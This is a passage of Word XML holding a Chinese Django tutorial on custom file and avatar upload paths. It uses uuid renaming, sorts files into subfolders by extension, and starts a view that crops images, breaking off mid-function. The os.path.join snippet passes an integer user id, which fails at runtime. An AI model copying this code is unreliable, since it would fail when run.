    <w:p w14:paraId="1C07B799" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ext = filename.split('.')[-1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0196D484" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    filename = '{}.{}'.format(uuid.uuid4().hex[:8], ext)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F97DF91" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # return the whole path to the file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECCDCAF" w14:textId="71DE5AE4" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return "{0}/{1}/{2}".format(instance.user.id, "avatar", filename)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412CB351" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class UserProfile(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="619F5A62" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user = models.OneToOneField(User, on_delete=models.CASCADE, related_name='profile')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="098DC5AA" w14:textId="008B0F80" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    avatar = models.ImageField(upload_to=user_directory_path, verbose_name="</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>头像</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE4C9C6" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上述案例显然还有一个问题，不同系统路径分隔符/和\是不一样的，为保证代码在不同系统中能重用，更好的方式是使用python的os模块来拼接路径。如下图所示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="226C0E23" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E131F09" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273BDBA3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import uuid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174C6870" w14:textId="46035994" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79AD9792" w14:textId="061DF316" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your models here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CFFFE83" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def user_directory_path(instance, filename):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7167DFF9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ext = filename.split('.')[-1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E5079CC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    filename = '{}.{}'.format(uuid.uuid4().hex[:10], ext)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573DD464" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # return the whole path to the file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BAEA486" w14:textId="03484223" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return os.path.join(instance.user.id, "avatar", filename)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FBDC413" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class UserProfile(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58184075" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user = models.OneToOneField(User, on_delete=models.CASCADE, related_name='profile')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A1D818D" w14:textId="20BCBA6A" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    avatar = models.ImageField(upload_to=user_directory_path, verbose_name="</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>头像</w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCE14AF" w14:textId="0DBF5B5D" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用户上传文件可能是图片，也可能是pdf文件，我们如何把它们放在同一用户的不同文件夹下呢？实现这个很简单，如下图所示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B55A8F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def user_directory_path(instance, filename):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08882ED5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ext = filename.split('.')[-1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270FBA5F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    filename = '{}.{}'.format(uuid.uuid4().hex[:8], ext)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063F5D9D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    sub_folder = 'file'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A544A00" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if ext.lower() in ["jpg", "png", "gif"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48504590" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        sub_folder = "avatar"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A74EF19" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if ext.lower() in ["pdf", "docx"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE83DFF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        sub_folder = "document"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DF5081" w14:textId="12742BC2" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return os.path.join(instance.user.id, sub_folder, filename)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09206226" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法2: 在视图中自定义上传图片或文件路径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD6527C" w14:textId="71D1A357" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>方法1最简单直白，但有一个较大缺陷，文件上传后未经处理就直接存储了。假如用户上传了图片，我们希望先对其压缩或裁剪，然后再存储，或者我们不希望上传图片或文件到默认的路径，这时我们就有必要在视图中自定义图片或文件路径了。例子如下。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="280A00EC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@login_required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7127480F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def ajax_avatar_upload(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44063809" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user = request.user</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D865C0" w14:textId="397C54E5" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user_profile = get_object_or_404(UserProfile, user=user)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7841687D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792848D9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        form = AvatarUploadForm(request.POST, request.FILES)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D01ECC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if form.is_valid():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46185E67" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            img = request.FILES['avatar_file']  # </w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>获取上传图片</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB59FED" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            cropped_avatar = crop_image(img, user.id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="666A9364" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            user_profile.avatar = cropped_avatar  # </w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>将图片路径修改到当前会员数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0E61F2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>user_profile.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C480DC" w14:textId="775CAD96" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return HttpResponseRedirect(reverse('myaccount:profile'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D86C78" w14:textId="496D0B70" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def crop_image(file, uid):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53507245" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
